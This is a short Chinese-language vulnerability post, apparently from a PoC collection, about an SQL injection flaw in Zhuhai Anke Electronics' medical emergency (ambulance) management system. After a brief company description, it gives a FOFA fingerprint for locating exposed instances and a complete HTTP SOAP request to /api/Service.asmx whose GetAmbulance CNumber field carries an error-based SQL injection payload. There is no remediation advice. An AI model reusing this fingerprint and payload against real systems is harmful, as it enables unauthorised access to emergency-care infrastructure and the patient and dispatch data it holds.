# 珠海市安克电子技术有限公司医疗急救管理系统存在SQL注入漏洞
珠海市安克电子技术有限公司成立于1992年，专业从事急救信息化系统集成与软件开发，是国内领先的院前急救信息系统供应商。在北京、合肥、西安设有研发中心，在全国设有分支机构和服务网点20个，具有ISO9000等质量体系、高新技术企业、软件企业、信息系统集成等多项认证资质<font style="color:rgb(102, 102, 102);">，</font>珠海市安克电子技术有限公司医疗急救管理系统存在SQL注入漏洞。

## fofa
```javascript
fid="v6Cd4x0Px/YZrVqV3jQ3xQ=="
```

![](https://cdn.nlark.com/yuque/0/2024/png/21711125/1730787843764-4e1b3e61-0356-40a1-8d4e-f1bd5d92cf5a.png)

## poc
```java
POST /api/Service.asmx HTTP/1.1
X-Requested-With: XMLHttpRequest
Cookie: ASP.NET_SessionId=exrktu3aplxg004tcc2ntnuw; FailCount=5; ASPSESSIONIDSSDTSCDA=OLGBFHMCDJBLGKGENPLEECCO
SOAPAction: http://tempuri.org/GetAmbulance
Content-Type: text/xml
Content-Length: 296
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)
Host: 
Connection: Keep-alive

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/">
	<soap:Header />
	<soap:Body>
		<tns:GetAmbulance>
			<tns:CNumber>11' AND 6537 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (6537=6537) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(113)))-- ntgj</tns:CNumber>
		</tns:GetAmbulance>
	</soap:Body>
</soap:Envelope>
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1731332070574-8670e58d-e01a-42eb-a55c-c5afe4928fdc.png)



